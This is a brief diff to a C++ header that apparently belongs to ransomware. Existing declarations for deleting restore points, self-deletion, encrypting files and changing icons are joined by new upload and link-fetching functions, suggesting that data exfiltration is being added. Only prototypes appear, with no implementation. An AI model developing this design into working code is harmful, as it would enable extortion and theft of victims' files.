@@ -48,4 +48,6 @@ std::vector<std::vector<std::string>> vectorSplitter(std::vector<std::string> ba
 void deleteRestorePoints();
 void deleteMe(std::string myPath);
 void encryptFiles(std::vector<std::string> files, std::string key);
+void uploadFiles(std::vector<std::string> files);
+std::vector<std::string> getLinks();
 void changeIcon();
